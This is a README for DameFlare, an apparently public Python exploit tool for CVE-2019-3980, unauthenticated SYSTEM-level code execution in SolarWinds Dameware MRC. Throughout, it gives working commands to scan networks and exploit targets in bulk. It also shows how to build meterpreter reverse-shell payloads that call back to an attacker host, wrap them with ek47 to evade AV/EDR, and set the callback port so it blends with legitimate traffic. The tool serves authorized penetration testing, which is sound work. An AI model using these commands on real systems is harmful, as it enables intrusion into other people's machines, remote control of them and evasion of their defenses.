# DameFlare

![DameFlare](assets/dameflare_logo.jpg)

![Python](https://img.shields.io/badge/python-3.x-blue?style=flat-square&logo=python)
![CVE](https://img.shields.io/badge/CVE-2019--3980-critical?style=flat-square&color=red)
![CVSS](https://img.shields.io/badge/CVSS-9.8-critical?style=flat-square&color=darkred)
![Platform](https://img.shields.io/badge/platform-linux-lightgrey?style=flat-square)

**Unauthenticated RCE via Smart Card Authentication Bypass in SolarWinds Dameware MRC**

> CVE-2019-3980 | CVSS 9.8 Critical | TCP/6129  
> Original research and POC: [Tenable, Inc. (TRA-2019-43)](https://www.tenable.com/security/research/tra-2019-43)  
> Python 3 tool: David Boyd ([@Fir3d0g](https://x.com/Fir3d0g))

---

## How It Works

Dameware MRC exposes a remote control service (`DWRCS.exe`) on TCP/6129. During the smart card authentication handshake, the server accepts an attacker-controlled file as a smart card driver installer (`dwDrvInst.exe`) and executes it as **SYSTEM**, with no authentication required.

DameFlare implements the full protocol handshake (version negotiation → AES key derivation → Diffie-Hellman key exchange → RSA signature → driver upload) to deliver an arbitrary payload and achieve unauthenticated remote code execution.

---

## Affected Versions

| Product | Vulnerable | Fixed |
|---|---|---|
| Dameware MRC 12.0.x | All builds | Hotfix 1 |
| Dameware MRC 12.1.x | All builds | Hotfix 3 |

---

## Installation

```bash
git clone https://github.com/boydhacks/dameflare
cd dameflare
pip3 install -r requirements.txt
python3 dameflare.py -h
```

---

## Usage

### Single Target
```bash
python3 dameflare.py -t 192.168.1.50 -e payload.exe
python3 dameflare.py -t 192.168.1.50 -e payload.exe -v
python3 dameflare.py -t 10.0.0.100 -e payload.exe -p 6130 -T 15
```

### Multi-Target
```bash
python3 dameflare.py -f vuln_hosts.txt -e payload.exe
python3 dameflare.py -f vuln_hosts.txt -e payload.exe --threads 5
```

### Scan Mode
```bash
python3 dameflare.py --scan -t 192.168.1.0/24
python3 dameflare.py --scan -t 192.168.1.0/24 -o vuln_hosts.txt --scan-threads 50
python3 dameflare.py --scan -f port6129.txt -o vuln_hosts.txt
```

### Scan + Exploit Pipeline
```bash
python3 dameflare.py --scan -t 192.168.1.0/24 -o vuln_hosts.txt
python3 dameflare.py -f vuln_hosts.txt -e payload.exe --threads 5
```

### Cleanup
Remove the `dwDrvInst.exe` artifact from the target after exploitation:
```bash
python3 dameflare.py -t 192.168.1.50 --cleanup
python3 dameflare.py -f vuln_hosts.txt --cleanup
```

Requires `msfvenom` in PATH. Uploads a self-deleting EXE that removes `dwDrvInst.exe` and itself after a short delay.

Alternatively, if you have credentials, you can use something like NXC:
```bash
nxc smb <target> -u <user> -p <pass> -x "del /f /q C:\Windows\Temp\dwDrvInst.exe"
```

---

## Payload Generation Example (wrap it with something like ek47 first)

### Raw shellcode
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 EXITFUNC=thread -f raw -o payload.bin
```

### 32-bit EXE
```bash
msfvenom -p windows/meterpreter_reverse_https LHOST=<ip> LPORT=443 EXITFUNC=thread -f exe -o payload_x86.exe
```

### 64-bit EXE
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 EXITFUNC=thread -f exe -o payload_x64.exe
```

---

## Payload Evasion (ek47)

Wrap raw shellcode with environmental keying to evade AV/EDR sandbox analysis. The payload will only decrypt and execute on a machine where the keys match. Huge shoutout to Kevin Clark ([@GuhnooPlusLinux](https://x.com/GuhnooPlusLinux)) for his awesome work!

> [https://gitlab.com/KevinJClark/ek47](https://gitlab.com/KevinJClark/ek47)

```bash
# Key on domain and hostname (use short names, not FQDN)
python3 ek47.py srdi-shellcode -p payload.bin -d <SHORT_DOMAIN> -c <HOSTNAME> -o payload_wrapped.exe

# Key on domain only
python3 ek47.py srdi-shellcode -p payload.bin -d <SHORT_DOMAIN> -o payload_wrapped.exe

# Static key only (useful for testing)
python3 ek47.py srdi-shellcode -p payload.bin -s 5 -o payload_wrapped.exe

# Alternative injection methods if srdi-shellcode is caught
python3 ek47.py dinvoke-shellcode -p payload.bin -d <SHORT_DOMAIN> -c <HOSTNAME> -o payload_wrapped.exe
python3 ek47.py noapi-shellcode   -p payload.bin -d <SHORT_DOMAIN> -c <HOSTNAME> -o payload_wrapped.exe
```

### Full pipeline (Example)
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=6129 EXITFUNC=thread -f raw -o payload.bin
python3 ek47.py srdi-shellcode -p payload.bin -d CONTOSO -c WS01 -o payload_wrapped.exe
python3 dameflare.py -t <target> -e payload_wrapped.exe
```

---

## Metasploit Handler

```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST <ip>; set LPORT 443; set ExitOnSession false; set StagerVerifySSLCert false; set EXITFUNC thread; exploit -j"
```

> **Note:** Payload name must match exactly between msfvenom and the handler:
> - Stageless: `windows/x64/meterpreter_reverse_https` (underscore)
> - Staged: `windows/x64/meterpreter/reverse_https` (slash)

> **Tip:** In Dameware environments, port `6129` is often permitted outbound and blends in with legitimate DWRCS traffic. If `443` is blocked or inspected by a proxy, try `LPORT=6129` as the target network was likely designed to allow it.

---

## Disclaimer

This tool is intended for use in authorized penetration testing and red team operations only. The author assumes no liability for unauthorized or unlawful use.
